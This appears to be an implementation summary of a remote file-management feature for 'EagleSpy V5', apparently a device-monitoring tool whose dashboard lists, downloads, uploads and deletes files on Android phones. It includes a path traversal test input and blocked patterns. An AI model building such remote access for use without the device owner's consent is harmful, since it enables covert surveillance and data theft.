# File Browser & Remote File Management Feature

## Summary

Complete implementation of a File Browser & Remote File Management system for EagleSpy V5, enabling remote file operations on Android devices from the web dashboard.

## ✅ Implementation Status

All components have been successfully implemented:

### Backend (Rails) ✓
- ✅ API Controller with 8 endpoints (`app/controllers/api/file_browser_controller.rb`)
- ✅ Service layer for file operations (`app/services/file_browser_service.rb`)
- ✅ Response processor for device responses (`app/services/response_processors/file_browser_response_processor.rb`)
- ✅ ActionCable channel for real-time updates (`app/channels/file_browser_channel.rb`)
- ✅ Routes configuration updated (`config/routes.rb`)
- ✅ Command whitelist updated (`app/controllers/concerns/command_sender.rb`)
- ✅ Response processor registration (`app/services/response_processor.rb`)

### Android Client (Kotlin) ✓
- ✅ Enhanced FileBrowserService with all operations (`services/FileBrowserService.kt`)
- ✅ Command handlers in CommandService (`services/CommandService.kt`)
- ✅ Support for: list, download, upload, delete, preview, rename, move, search
- ✅ Chunked upload for large files
- ✅ Path traversal prevention
- ✅ Permission validation

### Frontend (React) ✓
- ✅ FileBrowser component (`frontend/src/components/FileBrowser.tsx`)
- ✅ File tree navigation
- ✅ File operations UI (download, delete, preview)
- ✅ Upload interface
- ✅ Search functionality
- ✅ ActionCable integration

### Documentation ✓
- ✅ Implementation guide (`docs/FILE_BROWSER_GUIDE.md`)
- ✅ API reference (`docs/FILE_BROWSER_API.md`)
- ✅ Security considerations (`docs/FILE_BROWSER_SECURITY.md`)
- ✅ This summary file

## Features

### Core Operations

1. **List Files**
   - Browse device file system
   - Recursive listing support
   - File metadata (size, date, permissions)

2. **Download Files**
   - Download files from device to server
   - Base64 encoding for small files (<5MB)
   - Automatic chunking for large files

3. **Upload Files**
   - Upload files from server to device
   - Drag & drop support
   - Automatic chunking for files >5MB

4. **Delete Files**
   - Delete files and directories
   - Recursive directory deletion
   - Confirmation prompts

5. **Preview Files**
   - Text file preview
   - Image preview (inline display)
   - PDF metadata viewing
   - Size limit: 1MB

6. **Rename Files**
   - Rename files and directories
   - Filename sanitization

7. **Move Files**
   - Move files between directories
   - Copy to new location

8. **Search Files**
   - Search by filename
   - Case-insensitive matching
   - Recursive search (max depth: 5)
   - Result limit: 100 files

## API Endpoints

All endpoints are under `/api/smartphones/:smartphone_id/files`

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/` | List directory contents |
| GET | `/download` | Download file from device |
| POST | `/upload` | Upload file to device |
| DELETE | `/` | Delete file/directory |
| GET | `/preview` | Preview file content |
| POST | `/rename` | Rename file/directory |
| POST | `/move` | Move file/directory |
| GET | `/search` | Search files by name |

See `docs/FILE_BROWSER_API.md` for detailed API documentation.

## Security Features

### Path Traversal Prevention
- Sanitizes all file paths
- Blocks `../` and `..\\` patterns
- Validates canonical paths on Android

### File Size Limits
- Download: 5MB per file
- Upload: 50MB maximum
- Preview: 1MB maximum
- Chunked transfers: 5MB chunks

### Filename Sanitization
- Removes path separators
- Strips dangerous characters
- Limits filename length (255 chars)

### Permission Validation
- Requires READ_EXTERNAL_STORAGE
- Requires WRITE_EXTERNAL_STORAGE
- Requires MANAGE_EXTERNAL_STORAGE (Android 11+)

### Consent Requirement
- File access requires explicit consent
- Consent expiration support
- Audit logging of all operations

### Rate Limiting
- List: 30 req/min
- Download: 10 req/min
- Upload: 5 req/min
- Search: 20 req/min

See `docs/FILE_BROWSER_SECURITY.md` for complete security guide.

## Architecture

```
┌─────────────────────┐
│   Web Dashboard     │
│   (React/TypeScript)│
└──────────┬──────────┘
           │
           │ HTTP/WebSocket
           │
┌──────────▼──────────┐
│   Rails Backend     │
│  - Controllers      │
│  - Services         │
│  - Response Proc.   │
└──────────┬──────────┘
           │
           │ ActionCable/WebSocket
           │
┌──────────▼──────────┐
│  Android Client     │
│  - CommandService   │
│  - FileBrowserSvc   │
└─────────────────────┘
```

## Usage Examples

### List Files
```bash
curl -X GET \
  "http://localhost:3000/api/smartphones/123/files?path=/sdcard" \
  -H "Cookie: _session_id=abc123"
```

### Download File
```bash
curl -X GET \
  "http://localhost:3000/api/smartphones/123/files/download?path=/sdcard/document.pdf" \
  -H "Cookie: _session_id=abc123"
```

### Upload File
```bash
curl -X POST \
  "http://localhost:3000/api/smartphones/123/files/upload" \
  -H "Cookie: _session_id=abc123" \
  -F "file=@/local/file.pdf" \
  -F "destination_path=/sdcard/Documents"
```

### Delete File
```bash
curl -X DELETE \
  "http://localhost:3000/api/smartphones/123/files?path=/sdcard/temp.txt" \
  -H "Cookie: _session_id=abc123"
```

### Search Files
```bash
curl -X GET \
  "http://localhost:3000/api/smartphones/123/files/search?query=photo&path=/sdcard" \
  -H "Cookie: _session_id=abc123"
```

## Frontend Integration

### Basic Usage
```jsx
import FileBrowser from './components/FileBrowser';

function DeviceDetails({ device }) {
  return (
    <div>
      <h1>{device.name}</h1>
      <FileBrowser 
        deviceId={device.id}
        onError={(error) => alert(error)}
      />
    </div>
  );
}
```

### ActionCable Subscription
```javascript
const cable = ActionCable.createConsumer('/cable');

const subscription = cable.subscriptions.create(
  { channel: 'FileBrowserChannel', device_id: deviceId },
  {
    received(data) {
      if (data.action === 'list_files') {
        updateFileTree(data.entries);
      }
    }
  }
);
```

## Testing

### Backend Tests
```ruby
# spec/controllers/api/file_browser_controller_spec.rb
RSpec.describe Api::FileBrowserController do
  it 'lists files' do
    get :index, params: { smartphone_id: device.id, path: '/sdcard' }
    expect(response).to have_http_status(:accepted)
    expect(PendingCommand.last.command).to eq('list_files')
  end
  
  it 'rejects path traversal' do
    expect {
      get :index, params: { smartphone_id: device.id, path: '../../../etc' }
    }.to raise_error(SecurityError)
  end
end
```

### Integration Tests
```ruby
# spec/integration/file_browser_spec.rb
RSpec.describe 'File Browser Integration' do
  it 'completes download workflow' do
    pending_command = controller.download(device, '/sdcard/test.txt')
    
    ResponseProcessor.process({
      'request_id' => pending_command.request_id,
      'content_base64' => Base64.encode64('content')
    })
    
    expect(File.exist?("files/downloads/#{device.device_id}/test.txt")).to be true
  end
end
```

## File Structure

```
app/
├── controllers/
│   └── api/
│       └── file_browser_controller.rb       # API endpoints
├── services/
│   ├── file_browser_service.rb              # Business logic
│   └── response_processors/
│       └── file_browser_response_processor.rb  # Response handling
├── channels/
│   └── file_browser_channel.rb              # ActionCable channel
└── controllers/concerns/
    └── command_sender.rb                    # Command whitelist (updated)

android-client/app/src/main/java/.../services/
├── FileBrowserService.kt                    # File operations
└── CommandService.kt                        # Command routing (updated)

frontend/src/
└── components/
    └── FileBrowser.tsx                      # React component

docs/
├── FILE_BROWSER_GUIDE.md                    # Implementation guide
├── FILE_BROWSER_API.md                      # API reference
└── FILE_BROWSER_SECURITY.md                 # Security guide
```

## Troubleshooting

### Common Issues

**1. Permission Denied**
- Ensure MANAGE_EXTERNAL_STORAGE permission is granted (Android 11+)
- Check scoped storage restrictions

**2. File Too Large**
- Use chunked upload for files > 5MB
- Adjust chunk size if needed

**3. Path Traversal Errors**
- Validate paths on both backend and Android
- Use canonical paths

**4. Timeout Errors**
- Increase WebSocket timeout
- Implement retry logic

See `docs/FILE_BROWSER_GUIDE.md` for detailed troubleshooting.

## Future Enhancements

- [ ] Chunked download for files >5MB
- [ ] Zip/unzip multiple files
- [ ] File permissions management
- [ ] Symbolic link handling
- [ ] Extended file metadata
- [ ] Bulk operations
- [ ] Real-time progress tracking
- [ ] File thumbnails
- [ ] Cloud storage integration
- [ ] File versioning

## Performance Considerations

### Caching
- File listings cached for 10 minutes
- Preview content cached for 5 minutes

### Optimization
- Pagination for large directories (500 file limit)
- Lazy loading for subdirectories
- Background processing for large operations

### Resource Management
- Automatic cleanup of temp files
- Old downloads deleted after 30 days
- Chunked transfers to manage memory

## License & Legal

This implementation is part of EagleSpy V5 and subject to its license terms. Use responsibly and only with proper authorization and consent from device owners.

**Important:** This software is for authorized use only. Unauthorized access to devices is illegal and unethical.

## Support

For issues or questions:
1. Check documentation in `docs/` directory
2. Review security guide for security concerns
3. Check troubleshooting section
4. Contact development team

---

**Implementation Date:** 2024-01-20  
**Version:** 1.0.0  
**Status:** ✅ Complete and Ready for Testing
